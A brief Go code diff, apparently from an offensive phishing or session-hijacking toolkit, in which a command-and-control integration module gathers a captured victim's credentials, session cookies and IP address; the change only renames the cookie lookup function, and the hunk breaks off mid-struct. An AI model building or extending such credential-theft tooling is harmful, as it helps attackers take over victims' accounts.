@@ -75,7 +75,7 @@ func (m *C2IntegrationModule) handleSessionCaptured(ctx context.Context, eventTy
 		return nil
 	}
 	creds, _ := m.db.GetCredentials(ev.SessionID)
-	cookies, _ := m.db.GetCookies(ev.SessionID)
+	cookies, _ := m.db.GetCookiesBySession(ev.SessionID)
 	data := &c2.SessionData{
 		SessionID:   session.ID,
 		VictimIP:    session.VictimIP,
